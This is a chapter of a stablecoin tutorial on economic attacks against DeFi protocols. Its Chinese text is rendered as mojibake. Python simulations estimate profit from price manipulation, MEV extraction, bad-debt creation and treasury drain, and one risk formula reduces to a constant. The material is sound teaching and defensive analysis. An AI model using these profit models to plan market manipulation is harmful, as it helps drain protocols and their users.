<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ç¬¬åç« ï¼šç»æµæ”»å‡»ä¸é˜²å¾¡ - åŒºå—é“¾ç¨³å®šå¸æ•™ç¨‹</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
</head>
<body>
    <!-- å¯¼èˆªæ  -->
    <nav class="navbar">
        <div class="container">
            <a href="index.html" class="navbar-brand">ç¨³å®šå¸æ•™ç¨‹</a>
            <button class="navbar-toggle" onclick="toggleMobileNav()">â˜°</button>
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a href="index.html" class="nav-link">é¦–é¡µ</a>
                </li>
                <li class="nav-item">
                    <a href="intro.html" class="nav-link">å¼•è¨€</a>
                </li>
                <li class="nav-item dropdown">
                    <a href="#" class="nav-link">ç« èŠ‚</a>
                    <div class="dropdown-menu">
                        <a href="chapter1.html" class="dropdown-item">ç¬¬1ç« ï¼šåŒºå—é“¾åŸºç¡€</a>
                        <a href="chapter2.html" class="dropdown-item">ç¬¬2ç« ï¼šç¨³å®šå¸åˆ†ç±»</a>
                        <a href="chapter3.html" class="dropdown-item">ç¬¬3ç« ï¼šERC-20æ ‡å‡†</a>
                        <a href="chapter4.html" class="dropdown-item">ç¬¬4ç« ï¼šæŠµæŠ¼å‹è®¾è®¡</a>
                        <a href="chapter5.html" class="dropdown-item">ç¬¬5ç« ï¼šæ•°å­¦æ¨¡å‹</a>
                        <a href="chapter6.html" class="dropdown-item">ç¬¬6ç« ï¼šAMMé›†æˆ</a>
                        <a href="chapter7.html" class="dropdown-item">ç¬¬7ç« ï¼šå€Ÿè´·åè®®</a>
                        <a href="chapter8.html" class="dropdown-item">ç¬¬8ç« ï¼šæ”¶ç›Šç­–ç•¥</a>
                        <a href="chapter9.html" class="dropdown-item">ç¬¬9ç« ï¼šæ™ºèƒ½åˆçº¦å®‰å…¨</a>
                        <a href="chapter10.html" class="dropdown-item">ç¬¬10ç« ï¼šç»æµæ”»å‡»</a>
                        <a href="chapter11.html" class="dropdown-item">ç¬¬11ç« ï¼šæœªæ¥æ–¹å‘</a>
                        <a href="chapter12.html" class="dropdown-item">ç¬¬12ç« ï¼šç”Ÿäº§éƒ¨ç½²</a>
                        <a href="chapter13.html" class="dropdown-item">ç¬¬13ç« ï¼šç”Ÿæ€é›†æˆ</a>
                    </div>
                </li>
                <li class="nav-item">
                    <a href="index.html#resources" class="nav-link">èµ„æº</a>
                </li>
            </ul>
        </div>
    </nav>
    
    <!-- å¤´éƒ¨ -->
    <header id="top">
        <div class="container">
            <h1>ç¬¬åç« ï¼šç»æµæ”»å‡»ä¸é˜²å¾¡</h1>
        </div>
    </header>
    
    <!-- ä¸»è¦å†…å®¹ -->
    <div class="container">
        <div class="chapter">
<h2>ç¬¬åç« ï¼šç»æµæ”»å‡»ä¸é˜²å¾¡</h2>
        
        <p>åœ¨ç¬¬ä¹ç« è®¨è®ºäº†æŠ€æœ¯å±‚é¢çš„å®‰å…¨é˜²æŠ¤åï¼Œæœ¬ç« å°†ç„¦ç‚¹è½¬å‘æ›´åŠ éšè”½å’Œå¤æ‚çš„ç»æµæ”»å‡»ã€‚ä¸ä»£ç æ¼æ´ä¸åŒï¼Œç»æµæ”»å‡»åˆ©ç”¨çš„æ˜¯ç³»ç»Ÿçš„æ¿€åŠ±æœºåˆ¶å’Œå¸‚åœºåŠ¨æ€ï¼Œå¾€å¾€æ›´éš¾é¢„é˜²å’Œæ£€æµ‹ã€‚ä»ç»å…¸çš„é“¶è¡ŒæŒ¤å…‘åˆ°å¤æ‚çš„æ²»ç†æ”»å‡»ï¼Œä»é¢„è¨€æœºæ“çºµåˆ°é—ªç”µè´·å¥—åˆ©ï¼Œè¿™äº›æ”»å‡»æ‰‹æ®µè€ƒéªŒç€ç¨³å®šå¸ç³»ç»Ÿçš„ç»æµæ¨¡å‹è®¾è®¡ã€‚æœ¬ç« å°†è¿ç”¨åšå¼ˆè®ºã€é‡‘èå·¥ç¨‹å’Œç³»ç»ŸåŠ¨åŠ›å­¦çš„æ–¹æ³•ï¼Œæ·±å…¥å‰–æå„ç§ç»æµæ”»å‡»çš„åŸç†ï¼Œå¹¶æä¾›å®ç”¨çš„é˜²å¾¡ç­–ç•¥ã€‚</p>
        
        <div class="intro-box">
            <strong>æœ¬ç« æ¦‚è§ˆï¼š</strong>
            <ul>
                <li>ç»æµæ”»å‡»æ¨¡å‹åˆ†ç±»ä¸æ•°å­¦å»ºæ¨¡</li>
                <li>DeFiç‰¹å®šæ”»å‡»ï¼ˆé—ªç”µè´·ã€ä¸‰æ˜æ²»ã€é¢„è¨€æœºæ“çºµï¼‰</li>
                <li>é˜²å¾¡æœºåˆ¶è®¾è®¡ï¼ˆå»¶æ—¶å‡½æ•°ã€ç†”æ–­å™¨ã€åŠ¨æ€è´¹ç”¨ï¼‰</li>
                <li>å±æœºå“åº”ä¸ç³»ç»Ÿæ¢å¤ç­–ç•¥</li>
                <li>å†å²æ¡ˆä¾‹æ·±åº¦åˆ†æä¸æ•™è®­æ€»ç»“</li>
            </ul>
        </div>

        <h3 id="economic-attack-models">10.1 ç»æµæ”»å‡»æ¨¡å‹</h3>
        
        <div class="intro-box" style="background-color: #f0f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h4>ğŸ’° ç»æµæ”»å‡»ï¼šéšè”½çš„è‡´å‘½å¨èƒ</h4>
            <p>ç»æµæ”»å‡»æ˜¯ç¨³å®šå¸é¢ä¸´çš„æœ€å¤æ‚å¨èƒã€‚ä¸æ™ºèƒ½åˆçº¦æ¼æ´ä¸åŒï¼Œç»æµæ”»å‡»å¾€å¾€éšè—åœ¨æ­£å¸¸çš„å¸‚åœºè¡Œä¸ºä¸­ï¼Œåˆ©ç”¨ç³»ç»Ÿçš„ç»æµæ¿€åŠ±æœºåˆ¶è·åˆ©ã€‚å®ƒä»¬å¯èƒ½åœ¨æ•°å°æ—¶å†…é€ æˆæ•°åäº¿ç¾å…ƒæŸå¤±ï¼Œæ›´å±é™©çš„æ˜¯ï¼Œæ”»å‡»è€…é€šå¸¸çœ‹èµ·æ¥åƒæ˜¯åœ¨è¿›è¡Œ"åˆæ³•"çš„å¸‚åœºæ´»åŠ¨ã€‚</p>
            
            <div style="background-color: #e0f2fe; padding: 15px; border-radius: 8px; margin: 15px 0;">
                <h5>ğŸ¯ ç»æµæ”»å‡»çš„ä¸‰å¤§ç‰¹å¾ï¼š</h5>
                <ol>
                    <li><strong>éšè”½æ€§</strong>ï¼šè¡¨é¢çœ‹èµ·æ¥æ˜¯æ­£å¸¸çš„å¸‚åœºäº¤æ˜“</li>
                    <li><strong>ç³»ç»Ÿæ€§</strong>ï¼šä¸€æ—¦æˆåŠŸä¼šäº§ç”Ÿè¿é”ååº”</li>
                    <li><strong>ä¸å¯é€†æ€§</strong>ï¼šé€ æˆçš„æŸå¤±å¾€å¾€æ— æ³•æŒ½å›</li>
                </ol>
            </div>
        </div>
        
        <div class="info-box">
            <h4>ğŸ“Š 2023-2024å¹´ç»æµæ”»å‡»ç»Ÿè®¡</h4>
            <table style="width: 100%; border-collapse: collapse;">
                <thead>
                    <tr style="background-color: #f3f4f6;">
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">æ”»å‡»ç±»å‹</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">äº‹ä»¶æ•°é‡</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">å¹³å‡æŸå¤±</th>
                        <th style="border: 1px solid #e5e7eb; padding: 12px;">å æ¯”</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>é¢„è¨€æœºæ“çºµ</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">89æ¬¡</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">$8.2M</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">42%</td>
                    </tr>
                    <tr style="background-color: #f9fafb;">
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>é—ªç”µè´·å¥—åˆ©</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">147æ¬¡</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">$3.2M</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">35%</td>
                    </tr>
                    <tr>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>æ²»ç†æ”»å‡»</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">12æ¬¡</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">$45.7M</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">13%</td>
                    </tr>
                    <tr style="background-color: #f9fafb;">
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>é“¶è¡ŒæŒ¤å…‘</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">8æ¬¡</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">$2.1B</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">8%</td>
                    </tr>
                    <tr>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;"><strong>å…¶ä»–</strong></td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">24æ¬¡</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">$12.4M</td>
                        <td style="border: 1px solid #e5e7eb; padding: 12px;">2%</td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <div class="warning-box">
            <h4>âš ï¸ ç»æµæ”»å‡»çš„æ¼”è¿›è¶‹åŠ¿</h4>
            <ul>
                <li><strong>æ”»å‡»è§„æ¨¡å¢å¤§</strong>ï¼šå¹³å‡æ”»å‡»é‡‘é¢ä»2022å¹´çš„$2.4Må¢è‡³2024å¹´çš„$8.7M</li>
                <li><strong>æ‰‹æ³•æ›´åŠ å¤æ‚</strong>ï¼šå¤šåè®®ç»„åˆæ”»å‡»ã€è·¨é“¾æ”»å‡»å¢å¤š</li>
                <li><strong>æ£€æµ‹æ›´åŠ å›°éš¾</strong>ï¼šåˆ©ç”¨AIå’Œæœºå™¨å­¦ä¹ ä¼˜åŒ–æ”»å‡»ç­–ç•¥</li>
                <li><strong>å½±å“èŒƒå›´æ‰©å¤§</strong>ï¼šä»å•ä¸€åè®®æ‰©å±•è‡³æ•´ä¸ªç”Ÿæ€ç³»ç»Ÿ</li>
            </ul>
        </div>
        
        <div class="section-content">
            <p>ç¨³å®šå¸ç³»ç»Ÿé¢ä¸´å¤šç§ç»æµæ”»å‡»ï¼Œç†è§£è¿™äº›æ”»å‡»æ¨¡å‹å¯¹è®¾è®¡é˜²å¾¡æœºåˆ¶è‡³å…³é‡è¦ã€‚æœ¬èŠ‚å°†ä»æ•°å­¦å»ºæ¨¡è§’åº¦æ·±å…¥åˆ†æå„ç±»æ”»å‡»çš„æœºç†å’Œä¼ æ’­è·¯å¾„ã€‚</p>
        </div>
        
        <div class="theory-section">
            <h4>10.1.0 æ”»å‡»åˆ†ç±»ä½“ç³»</h4>
            <p>ä»æ”»å‡»æœºåˆ¶è§’åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç»æµæ”»å‡»åˆ†ä¸ºä»¥ä¸‹å‡ å¤§ç±»ï¼š</p>
            <ul>
                <li><strong>åŸºäºé¢„è¨€æœºçš„æ”»å‡» (Oracle-based)</strong>: é€šè¿‡æ“çºµä»·æ ¼æºå½±å“ç³»ç»Ÿå†³ç­–</li>
                <li><strong>åŸºäºæŠµæŠ¼å“/å‚¨å¤‡çš„æ”»å‡» (Collateral/Reserve-based)</strong>: åˆ©ç”¨èµ„äº§ä»·å€¼æ³¢åŠ¨åˆ¶é€ ç³»ç»Ÿæ€§é£é™©</li>
                <li><strong>åŸºäºåè®®é€»è¾‘çš„æ”»å‡» (Protocol Logic-based)</strong>: åˆ©ç”¨æœºåˆ¶è®¾è®¡ç¼ºé™·è¿›è¡Œå¥—åˆ©æˆ–æ²»ç†æ”»å‡»</li>
                <li><strong>ä¿¡è´·/å€ºåŠ¡æ”»å‡» (Credit/Debt Attack)</strong>: æ“çºµå€ºåŠ¡å‚æ•°åˆ¶é€ ä¸è‰¯å€ºåŠ¡</li>
                <li><strong>é•¿æœŸèµ„æœ¬æ¶ˆè€—æ”»å‡» (Long-term Capital Drain)</strong>: æŒç»­å¾®å°å¥—åˆ©ç¼“æ…¢æ¶ˆè€—åè®®å‚¨å¤‡</li>
            </ul>
            
            <h4>10.1.1 æ”»å‡»ç±»å‹åˆ†ç±»</h4>
            
            <div class="example-box" style="background-color: #fef3c7; margin: 20px 0;">
                <h4>ğŸ”„ æ”»å‡»ç±»å‹çš„æ¼”è¿›å†ç¨‹</h4>
                <p>ç»æµæ”»å‡»æ‰‹æ³•éšç€DeFiçš„å‘å±•è€Œä¸æ–­æ¼”è¿›ï¼š</p>
                <ul>
                    <li><strong>2020-2021ï¼š</strong>ç®€å•çš„é—ªç”µè´·å¥—åˆ©ï¼Œåˆ©ç”¨ä»·æ ¼å·®å¼‚</li>
                    <li><strong>2022ï¼š</strong>é¢„è¨€æœºæ“çºµæˆä¸ºä¸»æµï¼ŒUST/Lunaå´©æºƒ</li>
                    <li><strong>2023ï¼š</strong>æ²»ç†æ”»å‡»å…´èµ·ï¼Œå¤šåè®®ç»„åˆæ”»å‡»</li>
                    <li><strong>2024ï¼š</strong>AIé©±åŠ¨æ”»å‡»ï¼Œè·¨é“¾å¤æ‚æ”»å‡»å¢å¤š</li>
                </ul>
            </div>
            
            <h5>1. å¸‚åœºæ“çºµæ”»å‡»</h5>
            <ul>
                <li><strong>ä»·æ ¼æ“çºµï¼ˆPrice Manipulationï¼‰</strong>ï¼šé€šè¿‡å¤§é¢äº¤æ˜“å½±å“é¢„è¨€æœºä»·æ ¼</li>
                <li><strong>æµåŠ¨æ€§æ”»å‡»ï¼ˆLiquidity Attackï¼‰</strong>ï¼šè€—å°½ç‰¹å®šæ± å­çš„æµåŠ¨æ€§</li>
                <li><strong>ä¸‰æ˜æ²»æ”»å‡»ï¼ˆSandwich Attackï¼‰</strong>ï¼šåœ¨ç”¨æˆ·äº¤æ˜“å‰åæ’å…¥äº¤æ˜“è·åˆ©</li>
                <li><strong>æ—¶é—´å¼ºç›—æ”»å‡»ï¼ˆTime Bandit Attackï¼‰</strong>ï¼šé€šè¿‡åŒºå—é‡ç»„è·å–MEV</li>
            </ul>
            
            <h5>2. ç³»ç»Ÿæ€§æ”»å‡»</h5>
            <ul>
                <li><strong>é“¶è¡ŒæŒ¤å…‘ï¼ˆBank Runï¼‰</strong>ï¼šå¤§è§„æ¨¡èµå›å¼•å‘çš„è¿é”ååº”</li>
                <li><strong>æ­»äº¡èºæ—‹ï¼ˆDeath Spiralï¼‰</strong>ï¼šè´Ÿåé¦ˆå¾ªç¯å¯¼è‡´ç³»ç»Ÿå´©æºƒ</li>
                <li><strong>åèº«æ€§æ”»å‡»ï¼ˆReflexivity Attackï¼‰</strong>ï¼šåˆ©ç”¨å¸‚åœºé¢„æœŸè‡ªæˆ‘å®ç°çš„ç‰¹æ€§</li>
                <li><strong>æ²»ç†æ”»å‡»ï¼ˆGovernance Attackï¼‰</strong>ï¼šé€šè¿‡æ§åˆ¶æŠ•ç¥¨æƒæ”¹å˜ç³»ç»Ÿå‚æ•°</li>
                <li><strong>çº§è”æ¸…ç®—ï¼ˆCascading Liquidationï¼‰</strong>ï¼šè¿ç¯æ¸…ç®—å¼•å‘çš„ç³»ç»Ÿæ€§é£é™©</li>
            </ul>
            
            <h5>3. æ–°å‹ç»æµæ”»å‡»æ¨¡å¼</h5>
            <p>é™¤äº†ä¼ ç»Ÿæ”»å‡»å¤–ï¼Œ2024å¹´å‡ºç°äº†æ›´åŠ éšè”½å’Œå¤æ‚çš„æ”»å‡»æ¨¡å¼ï¼š</p>
            
            <ul>
                <li><strong>ä¿¡è´·/å€ºåŠ¡æ”»å‡»ï¼ˆCredit/Debt Attackï¼‰</strong>ï¼šé€šè¿‡æ“çºµå€ºåŠ¡ä¸Šé™ã€æ¸…ç®—å‚æ•°åˆ¶é€ ç³»ç»Ÿæ€§é£é™©</li>
                <li><strong>é•¿æœŸèµ„æœ¬æ¶ˆè€—æ”»å‡»ï¼ˆLong-term Capital Drainï¼‰</strong>ï¼šæŒç»­å°é¢å¥—åˆ©ï¼Œç¼“æ…¢æ¶ˆè€—åè®®èµ„æœ¬</li>
                <li><strong>å†è´¨æŠ¼é£é™©æ”»å‡»ï¼ˆRestaking Risk Attackï¼‰</strong>ï¼šåˆ©ç”¨LRTå¤šå±‚é£é™©å åŠ çš„è„†å¼±æ€§</li>
                <li><strong>è·¨é“¾æ¡¥æ”»å‡»ï¼ˆBridge Attackï¼‰</strong>ï¼šæ”»å‡»è–„å¼±è·¨é“¾æ¡¥ï¼Œç¨€é‡Šç¨³å®šå¸ä»·å€¼</li>
            </ul>
            
            <h5>4. åèº«æ€§ç†è®ºä¸ç¨³å®šå¸</h5>
            <p>åèº«æ€§ï¼ˆReflexivityï¼‰æ˜¯ç´¢ç½—æ–¯æå‡ºçš„æ ¸å¿ƒæ¦‚å¿µï¼Œåœ¨ç¨³å®šå¸ç³»ç»Ÿä¸­è¡¨ç°å°¤ä¸ºæ˜æ˜¾ã€‚å¸‚åœºå‚ä¸è€…çš„é¢„æœŸä¼šå½±å“å¸‚åœºä»·æ ¼ï¼Œè€Œä»·æ ¼å˜åŒ–åˆä¼šå¼ºåŒ–æˆ–æ”¹å˜é¢„æœŸï¼Œå½¢æˆè‡ªæˆ‘å¼ºåŒ–çš„å¾ªç¯ã€‚</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># ç»æµæ”»å‡»æ”¶ç›Šæ¨¡å‹
import numpy as np
from typing import Dict, Tuple

class EconomicAttackModel:
    def __init__(self, protocol_params: Dict):
        self.liquidity = protocol_params['liquidity']
        self.fee_rate = protocol_params['fee_rate']
        self.slippage_factor = protocol_params['slippage_factor']
        self.oracle_delay = protocol_params['oracle_delay']
    
    def calculate_manipulation_profit(
        self, 
        attack_capital: float,
        market_impact: float,
        manipulation_duration: int
    ) -> Tuple[float, float]:
        """è®¡ç®—ä»·æ ¼æ“çºµæ”»å‡»çš„æ½œåœ¨æ”¶ç›Š"""
        
        # æ“çºµæˆæœ¬ï¼šäº¤æ˜“è´¹ç”¨ + æ»‘ç‚¹æŸå¤±
        manipulation_cost = (
            attack_capital * self.fee_rate * 2 +  # ä¹°å…¥+å–å‡º
            attack_capital * self.slippage_factor * market_impact
        )
        
        # ä»·æ ¼å½±å“
        price_impact = market_impact * (attack_capital / self.liquidity)
        
        # å¥—åˆ©æœºä¼šçª—å£
        arbitrage_window = min(manipulation_duration, self.oracle_delay)
        
        # æ½œåœ¨æ”¶ç›Šï¼šä»·æ ¼å·® Ã— å¯å¥—åˆ©é‡‘é¢
        potential_profit = price_impact * min(
            attack_capital * 0.5,  # å‡è®¾æœ€å¤šåˆ©ç”¨50%èµ„é‡‘å¥—åˆ©
            self.liquidity * 0.1   # ä¸èƒ½è¶…è¿‡æµåŠ¨æ€§çš„10%
        ) * arbitrage_window
        
        # å‡€æ”¶ç›Š
        net_profit = potential_profit - manipulation_cost
        
        # æˆåŠŸæ¦‚ç‡ï¼ˆè€ƒè™‘MEVç«äº‰ï¼‰
        success_probability = 1 / (1 + np.exp(-arbitrage_window + 2))
        
        return net_profit, success_probability
    
    def simulate_bank_run(
        self,
        initial_redemption_rate: float,
        contagion_factor: float,
        reserve_ratio: float,
        time_steps: int = 100
    ) -> np.ndarray:
        """æ¨¡æ‹Ÿé“¶è¡ŒæŒ¤å…‘åœºæ™¯"""
        
        redemption_history = np.zeros(time_steps)
        reserves = 1.0  # æ ‡å‡†åŒ–å‚¨å¤‡ä¸º1
        
        for t in range(time_steps):
            # æŒ¤å…‘å¼ºåº¦éšå‚¨å¤‡å‡å°‘è€Œå¢åŠ 
            panic_multiplier = 1 + contagion_factor * (1 - reserves)
            
            # å½“æœŸèµå›ç‡
            current_redemption = min(
                initial_redemption_rate * panic_multiplier * (1.1 ** t),
                reserves  # ä¸èƒ½è¶…è¿‡å‰©ä½™å‚¨å¤‡
            )
            
            redemption_history[t] = current_redemption
            reserves -= current_redemption
            
            # å‚¨å¤‡è€—å°½ï¼Œç³»ç»Ÿå´©æºƒ
            if reserves <= 0:
                redemption_history[t+1:] = 0
                break
            
            # å¦‚æœå‚¨å¤‡ç‡è¿‡ä½ï¼Œè§¦å‘æ­»äº¡èºæ—‹
            if reserves < reserve_ratio * 0.5:
                initial_redemption_rate *= 1.5
        
        return redemption_history
    
    def calculate_mev_extraction(
        self,
        transaction_value: float,
        gas_price: float,
        block_space_competition: float
    ) -> float:
        """è®¡ç®—MEVæå–çš„æœŸæœ›æ”¶ç›Š"""
        
        # åŸºç¡€MEVæœºä¼š
        base_mev = transaction_value * 0.03  # å‡è®¾3%çš„ä»·å€¼å¯æå–
        
        # ç«äº‰å› å­ï¼ˆæ›´å¤šç«äº‰è€…é™ä½æ”¶ç›Šï¼‰
        competition_discount = 1 / (1 + block_space_competition)
        
        # Gasæˆæœ¬
        gas_cost = gas_price * 200000  # å‡è®¾å¤æ‚äº¤æ˜“éœ€è¦20ä¸‡gas
        
        # æœŸæœ›MEVæ”¶ç›Š
        expected_mev = base_mev * competition_discount - gas_cost
        
        return max(0, expected_mev)

# ä½¿ç”¨ç¤ºä¾‹
protocol = {
    'liquidity': 10_000_000,  # 1000ä¸‡ç¾å…ƒæµåŠ¨æ€§
    'fee_rate': 0.003,        # 0.3%æ‰‹ç»­è´¹
    'slippage_factor': 0.01,  # 1%åŸºç¡€æ»‘ç‚¹
    'oracle_delay': 10        # 10ä¸ªåŒºå—çš„é¢„è¨€æœºå»¶è¿Ÿ
}

model = EconomicAttackModel(protocol)

# åˆ†æä»·æ ¼æ“çºµæ”»å‡»
profit, prob = model.calculate_manipulation_profit(
    attack_capital=1_000_000,  # 100ä¸‡ç¾å…ƒæ”»å‡»èµ„é‡‘
    market_impact=0.1,         # 10%å¸‚åœºå½±å“
    manipulation_duration=5    # 5ä¸ªåŒºå—
)

print(f"æ”»å‡»å‡€æ”¶ç›Š: ${profit:,.2f}")
print(f"æˆåŠŸæ¦‚ç‡: {prob:.2%}")</code></pre>
                </div>
            </div>
            
            <h4>10.1.2 ä¿¡è´·/å€ºåŠ¡æ”»å‡»æ¨¡å‹</h4>
            <p>åœ¨è¶…é¢æŠµæŠ¼ç¨³å®šå¸ç³»ç»Ÿä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ“çºµå€ºåŠ¡å‚æ•°æ¥åˆ¶é€ ç³»ç»Ÿæ€§é£é™©ï¼š</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># ä¿¡è´·/å€ºåŠ¡æ”»å‡»å»ºæ¨¡
class CreditDebtAttack:
    """æ¨¡æ‹Ÿé’ˆå¯¹MakerDAOç±»å‹ç³»ç»Ÿçš„ä¿¡è´·æ”»å‡»"""
    
    def __init__(self, protocol_params: dict):
        self.debt_ceiling = protocol_params['debt_ceiling']
        self.stability_fee = protocol_params['stability_fee']
        self.liquidation_ratio = protocol_params['liquidation_ratio']
        self.liquidation_penalty = protocol_params['liquidation_penalty']
        self.governance_token_supply = protocol_params['governance_token_supply']
        
    def calculate_bad_debt_creation(self, 
                                   collateral_volatility: float,
                                   attacker_capital: float,
                                   market_conditions: dict) -> dict:
        """è®¡ç®—æ¶æ„åˆ›å»ºåè´¦çš„æˆæœ¬ä¸å½±å“"""
        
        # æ”»å‡»è€…å¯ä»¥å¼€è®¾çš„æœ€å¤§å€ºåŠ¡å¤´å¯¸
        max_debt_position = attacker_capital * self.liquidation_ratio
        
        # åœ¨æç«¯å¸‚åœºæ¡ä»¶ä¸‹çš„é¢„æœŸæŸå¤±
        extreme_drop = market_conditions['black_swan_probability'] * market_conditions['max_drawdown']
        
        # åˆ¶é€ åè´¦çš„é¢„æœŸæˆæœ¬
        bad_debt_cost = max_debt_position * (extreme_drop - (1 - 1/self.liquidation_ratio))
        
        # å¯¹ç³»ç»Ÿçš„å½±å“
        system_impact = {
            'bad_debt_amount': max(0, bad_debt_cost),
            'debt_ceiling_utilization': max_debt_position / self.debt_ceiling,
            'required_mkr_mint': bad_debt_cost / market_conditions['mkr_price'],  # éœ€è¦é“¸é€ çš„MKR
            'mkr_dilution': bad_debt_cost / (market_conditions['mkr_price'] * self.governance_token_supply)
        }
        
        return system_impact
    
    def simulate_debt_ceiling_manipulation(self, 
                                         governance_control: float,
                                         time_horizon: int) -> list:
        """æ¨¡æ‹Ÿé€šè¿‡æ²»ç†æ“çºµå€ºåŠ¡ä¸Šé™çš„æ”»å‡»"""
        results = []
        current_ceiling = self.debt_ceiling
        
        for t in range(time_horizon):
            # æ²»ç†ææ¡ˆé€šè¿‡æ¦‚ç‡
            proposal_success = governance_control > 0.5  # ç®€åŒ–ï¼šè¶…è¿‡50%æ§åˆ¶æƒ
            
            if proposal_success:
                # æ¯æ¬¡å¯ä»¥æé«˜20%å€ºåŠ¡ä¸Šé™
                current_ceiling *= 1.2
                
                # ç³»ç»Ÿé£é™©æŒ‡æ ‡
                risk_score = self._calculate_systemic_risk(current_ceiling)
                
                results.append({
                    'time': t,
                    'debt_ceiling': current_ceiling,
                    'risk_score': risk_score,
                    'insolvency_probability': 1 - np.exp(-risk_score)
                })
        
        return results
    
    def _calculate_systemic_risk(self, debt_ceiling: float) -> float:
        """è®¡ç®—ç³»ç»Ÿæ€§é£é™©è¯„åˆ†"""
        # å€ºåŠ¡ä¸Šé™ç›¸å¯¹äºæŠµæŠ¼å“æ€»ä»·å€¼çš„æ¯”ç‡
        leverage_ratio = debt_ceiling / (debt_ceiling * self.liquidation_ratio)
        
        # é£é™©éšæ æ†æŒ‡æ•°å¢é•¿
        risk_score = leverage_ratio ** 2 * 0.1
        
        return min(risk_score, 1.0)

# ä½¿ç”¨ç¤ºä¾‹
maker_params = {
    'debt_ceiling': 10_000_000_000,  # 100äº¿ç¾å…ƒ
    'stability_fee': 0.05,  # 5%å¹´åŒ–
    'liquidation_ratio': 1.5,  # 150%
    'liquidation_penalty': 0.13,  # 13%
    'governance_token_supply': 1_000_000  # 100ä¸‡MKR
}

attacker = CreditDebtAttack(maker_params)

# åˆ†æåè´¦æ”»å‡»
market_conditions = {
    'black_swan_probability': 0.01,
    'max_drawdown': 0.5,
    'mkr_price': 2000
}

impact = attacker.calculate_bad_debt_creation(
    collateral_volatility=0.8,
    attacker_capital=50_000_000,  # 5000ä¸‡ç¾å…ƒ
    market_conditions=market_conditions
)

print(f"æ½œåœ¨åè´¦: ${impact['bad_debt_amount']:,.0f}")
print(f"MKRç¨€é‡Š: {impact['mkr_dilution']:.2%}")</code></pre>
                </div>
            </div>
            
            <h4>10.1.3 é•¿æœŸèµ„æœ¬æ¶ˆè€—æ”»å‡»</h4>
            <p>è¿™ç§æ”»å‡»é€šè¿‡æŒç»­çš„å°é¢å¥—åˆ©ç¼“æ…¢æ¶ˆè€—åè®®çš„èµ„æœ¬å‚¨å¤‡ï¼š</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># é•¿æœŸèµ„æœ¬æ¶ˆè€—æ”»å‡»æ¨¡æ‹Ÿ
class LongTermDrainAttack:
    """æ¨¡æ‹Ÿç¼“æ…¢æ¶ˆè€—åè®®èµ„æœ¬çš„æ”»å‡»ç­–ç•¥"""
    
    def __init__(self, protocol: dict):
        self.treasury_size = protocol['treasury_size']
        self.daily_volume = protocol['daily_volume']
        self.fee_structure = protocol['fee_structure']
        self.arbitrage_opportunities = protocol['arbitrage_opportunities']
        
    def calculate_drain_rate(self, 
                           attacker_sophistication: float,
                           market_inefficiency: float) -> dict:
        """è®¡ç®—èµ„æœ¬æ¶ˆè€—é€Ÿç‡"""
        
        # æ¯æ—¥å¯æ•è·çš„å¥—åˆ©æœºä¼š
        daily_arbitrage = (
            self.daily_volume * 
            market_inefficiency * 
            attacker_sophistication * 
            self.arbitrage_opportunities
        )
        
        # åè®®çš„é˜²å¾¡èƒ½åŠ›ï¼ˆé€šè¿‡è´¹ç”¨å›æ”¶ï¼‰
        protocol_recovery = self.daily_volume * self.fee_structure['base_fee']
        
        # å‡€æ¶ˆè€—ç‡
        net_drain = daily_arbitrage - protocol_recovery
        
        # é¢„è®¡è€—å°½æ—¶é—´
        if net_drain > 0:
            depletion_time = self.treasury_size / net_drain
        else:
            depletion_time = float('inf')
        
        return {
            'daily_drain': net_drain,
            'drain_percentage': net_drain / self.treasury_size,
            'depletion_days': depletion_time,
            'annual_loss': net_drain * 365
        }
    
    def simulate_adaptive_attack(self, days: int) -> list:
        """æ¨¡æ‹Ÿè‡ªé€‚åº”çš„æ¶ˆè€—æ”»å‡»"""
        results = []
        remaining_treasury = self.treasury_size
        
        for day in range(days):
            # æ”»å‡»è€…æ ¹æ®å‰©ä½™èµ„é‡‘è°ƒæ•´ç­–ç•¥
            aggressiveness = 1 - (remaining_treasury / self.treasury_size)
            
